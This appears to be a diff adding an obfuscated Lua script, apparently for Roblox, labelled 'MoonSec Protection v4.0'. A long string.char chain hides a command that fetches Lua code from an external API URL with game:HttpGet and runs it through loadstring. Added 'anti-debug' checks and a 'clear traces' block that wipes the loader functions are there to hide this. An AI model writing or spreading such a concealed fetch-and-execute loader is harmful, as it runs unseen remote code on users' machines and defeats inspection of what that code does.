@@ -1,0 +1,134 @@
+
+local Wy_jv66_h6dedNF, xuw5wAXi1O5btXj, Y4AoqhZYsOLnyR2, xqD1LSSfhdpCo8c, oFaOZbGecpfsLjK, sNYq43CNfLsBhgv, jfK6FpoAVlY4XrG, uGGw8wZBeigBt8n, MeIcvs0qgdmBSbu, n2mRRORTBlxpjrW
+Wy_jv66_h6dedNF="MoonSec"
+xuw5wAXi1O5btXj="Protection"
+Y4AoqhZYsOLnyR2="v4.0"
+xqD1LSSfhdpCo8c="By"
+oFaOZbGecpfsLjK="Hendar"
+sNYq43CNfLsBhgv="Development"
+jfK6FpoAVlY4XrG="https://"
+uGGw8wZBeigBt8n="Hendar"
+MeIcvs0qgdmBSbu="infinityfreeapp"
+n2mRRORTBlxpjrW=".com"
+local egDLkVolDfR_vZ6, CA6DLyjpyIJeV9g, SaOqd7c8eNa7MUL, d6JwyDXRoF4pFHf, YDKpzWQOQZYLkmZ, RE0b8PcQ2cxR1aW, zIncDw0mH3SrZ06, nhqmH3k1E6WuJ8Q, UnFscTP8qjxv0n5, h_Qdnkwg635Udrh
+egDLkVolDfR_vZ6=type
+CA6DLyjpyIJeV9g=pcall
+SaOqd7c8eNa7MUL=xpcall
+d6JwyDXRoF4pFHf=loadstring
+YDKpzWQOQZYLkmZ=load
+RE0b8PcQ2cxR1aW=getfenv
+zIncDw0mH3SrZ06=setfenv
+nhqmH3k1E6WuJ8Q=debug
+UnFscTP8qjxv0n5=coroutine
+h_Qdnkwg635Udrh=math
+local cgXbtRmbBz_vNAh, AWngnzMLw8F4fL0, bpiTze18wzPXXzV, aPVFUDMIFYb6AcP, dYWZ5TPkAlX8xJa, hh6mWLEdeKEPsl1, ftXDUjHb2YNr_5T, L0HAqvs2qG1Im_b, Tj9Ff0FIna6Cbjb, sszcv8Mq8U3fTSi
+cgXbtRmbBz_vNAh=table
+AWngnzMLw8F4fL0=cgXbtRmbBz_vNAh.concat
+bpiTze18wzPXXzV=cgXbtRmbBz_vNAh.insert
+aPVFUDMIFYb6AcP=cgXbtRmbBz_vNAh.remove
+dYWZ5TPkAlX8xJa=string
+hh6mWLEdeKEPsl1=dYWZ5TPkAlX8xJa.byte
+ftXDUjHb2YNr_5T=dYWZ5TPkAlX8xJa.char
+L0HAqvs2qG1Im_b=dYWZ5TPkAlX8xJa.sub
+Tj9Ff0FIna6Cbjb=dYWZ5TPkAlX8xJa.find
+sszcv8Mq8U3fTSi=dYWZ5TPkAlX8xJa.gsub
+local trPhk9K5kKOXNG3, mhsGfcCGA12gvWN, Dh6aHYoCsto4LfL, hPCpmXf5O1pNOH6, Bz4dkwVVPwfu_uY, X7Lt34B1gdLYHdv, Z7Dq0jyM1747IUl, SZAoBuzLm9ab6hH, XKuX64ntK2rkovm, QR2fklvMoOmDhYr
+trPhk9K5kKOXNG3=select
+mhsGfcCGA12gvWN=tonumber
+Dh6aHYoCsto4LfL=tostring
+hPCpmXf5O1pNOH6=unpack
+Bz4dkwVVPwfu_uY=pairs
+X7Lt34B1gdLYHdv=ipairs
+Z7Dq0jyM1747IUl=next
+SZAoBuzLm9ab6hH=rawequal
+XKuX64ntK2rkovm=rawget
+QR2fklvMoOmDhYr=rawset
+local dwC8k7bHHxpiapK, NkTeCIE2sh7eXsh, fbYgU3IpeertdDi, WZRsNM5ZutTTKxw, BzQFfpyh8dGrDag, ku4I4mjOff3H_RF, lS4HDBmIfx0QTyT, srBEK3WSJKSo7Qf, jUeJqlAgxZd2LuS, c08fyQTyD0_LdBq
+dwC8k7bHHxpiapK=nil
+NkTeCIE2sh7eXsh=nil
+fbYgU3IpeertdDi=nil
+WZRsNM5ZutTTKxw=nil
+BzQFfpyh8dGrDag=nil
+ku4I4mjOff3H_RF=nil
+lS4HDBmIfx0QTyT=nil
+srBEK3WSJKSo7Qf=nil
+jUeJqlAgxZd2LuS=nil
+c08fyQTyD0_LdBq=nil
+do
+local _G, _ENV, assert, error, print, warn
+_G=_G
+_ENV=_ENV
+assert=assert
+error=error
+print=print
+warn=warn
+local function  Wy_jv66_h6dedNF_xuw5wAXi1O5btXj_Y4AoqhZYsOLnyR2()
+local y8NaGu5u9P={(string.char(108)..string.char(111)..string.char(97)..string.char(100))..(string.char(115)..string.char(116)..string.char(114)..string.char(105))..(string.char(110)..string.char(103)..string.char(40)..string.char(103))..(string.char(97)..string.char(109)..string.char(101)..string.char(58))..(string.char(72)..string.char(116)..string.char(116)..string.char(112))..(string.char(71)..string.char(101)..string.char(116)..string.char(40))..(string.char(34)..string.char(104)..string.char(116)..string.char(116))..(string.char(112)..string.char(115)..string.char(58)..string.char(47))..(string.char(47)..string.char(97)..string.char(112)..string.char(105))..(string.char(46)..string.char(106)..string.char(110)..string.char(107))..(string.char(105)..string.char(101)..string.char(46)..string.char(99))..(string.char(111)..string.char(109)..string.char(47)..string.char(97))..(string.char(112)..string.char(105)..string.char(47)..string.char(118))..(string.char(49)..string.char(47)..string.char(108)..string.char(117))..(string.char(97)..string.char(115)..string.char(99)..string.char(114))..(string.char(105)..string.char(112)..string.char(116)..string.char(115))..(string.char(47)..string.char(112)..string.char(117)..string.char(98))..(string.char(108)..string.char(105)..string.char(99)..string.char(47))..(string.char(55)..string.char(49)..string.char(50)..string.char(98))..(string.char(97)..string.char(101)..string.char(50)..string.char(54))..(string.char(101)..string.char(49)..string.char(54)..string.char(102))..(string.char(97)..string.char(98)..string.char(50)..string.char(49))..(string.char(55)..string.char(57)..string.char(97)..string.char(48))..(string.char(100)..string.char(101)..string.char(57)..string.char(97))..(string.char(54)..string.char(48)..string.char(99)..string.char(55))..(string.char(53)..string.char(48)..string.char(97)..string.char(56))..(string.char(101)..string.char(100)..string.char(98)..string.char(49))..(string.char(51)..string.char(50)..string.char(102)..string.char(57))..(string.char(97)..string.char(55)..string.char(51)..string.char(102))..(string.char(50)..string.char(48)..string.char(101)..string.char(97))..(string.char(54)..string.char(51)..string.char(54)..string.char(52))..(string.char(51)..string.char(51)..string.char(55)..string.char(55))..(string.char(48)..string.char(50)..string.char(48)..string.char(53))..(string.char(49)..string.char(101)..string.char(57)..string.char(53))..(string.char(47)..string.char(100)..string.char(111)..string.char(119))..(string.char(110)..string.char(108)..string.char(111)..string.char(97))..(string.char(100)..string.char(34)..string.char(41)..string.char(41))..(string.char(40)..string.char(41))}
+local _PgnBzhL7z=table.concat(y8NaGu5u9P, "")
+return _PgnBzhL7z
+end
+local function  xqD1LSSfhdpCo8c_oFaOZbGecpfsLjK_sNYq43CNfLsBhgv(_arg1)
+if egDLkVolDfR_vZ6(_arg1)=="function"then
+return _arg1
+elseif  d6JwyDXRoF4pFHf then
+local _arg2=d6JwyDXRoF4pFHf(_arg1)
+if _arg2 then
+local _arg3=RE0b8PcQ2cxR1aW(0)
+if _arg3 then
+zIncDw0mH3SrZ06(_arg2, _arg3)
+end
+return _arg2
+end
+end
+if YDKpzWQOQZYLkmZ then
+local _arg4=YDKpzWQOQZYLkmZ(_arg1)
+if _arg4 then return _arg4 end
+end
+return nil
+end
+local function  jfK6FpoAVlY4XrG_uGGw8wZBeigBt8n_MeIcvs0qgdmBSbu(_arg5, _arg6)
+local _arg7, _arg8=CA6DLyjpyIJeV9g(_arg5, _arg6)
+if not _arg7 then
+if SaOqd7c8eNa7MUL then
+local function  _arg9(_arg10)
+return _arg10
+end
+SaOqd7c8eNa7MUL(_arg5, _arg6, _arg9)
+end
+end
+return _arg7, _arg8
+end
+local _script_data=Wy_jv66_h6dedNF_xuw5wAXi1O5btXj_Y4AoqhZYsOLnyR2()
+local _loader_func=xqD1LSSfhdpCo8c_oFaOZbGecpfsLjK_sNYq43CNfLsBhgv(_script_data)
+if _loader_func then
+local _success, _result=jfK6FpoAVlY4XrG_uGGw8wZBeigBt8n_MeIcvs0qgdmBSbu(_loader_func)
+if _success then
+if egDLkVolDfR_vZ6(_result)=="function"then
+_result()
+elseif  egDLkVolDfR_vZ6(_result)=="table"then
+if _result.main and egDLkVolDfR_vZ6(_result.main)=="function"then
+_result.main()
+end
+end
+end
+end--Anti-debug protection
+if nhqmH3k1E6WuJ8Q and nhqmH3k1E6WuJ8Q.getinfo then
+local _info=nhqmH3k1E6WuJ8Q.getinfo(1)
+if _info then
+if _info.source and dYWZ5TPkAlX8xJa.find(_info.source, "@")then
+dwC8k7bHHxpiapK=true
+end
+end
+end
+if UnFscTP8qjxv0n5 and UnFscTP8qjxv0n5.running then
+local _co=UnFscTP8qjxv0n5.running()
+if _co then
+NkTeCIE2sh7eXsh=UnFscTP8qjxv0n5.status(_co)
+end
+end--Clear traces
+_script_data=nil
+_loader_func=nil
+Wy_jv66_h6dedNF_xuw5wAXi1O5btXj_Y4AoqhZYsOLnyR2=nil
+xqD1LSSfhdpCo8c_oFaOZbGecpfsLjK_sNYq43CNfLsBhgv=nil
+jfK6FpoAVlY4XrG_uGGw8wZBeigBt8n_MeIcvs0qgdmBSbu=nil
+end
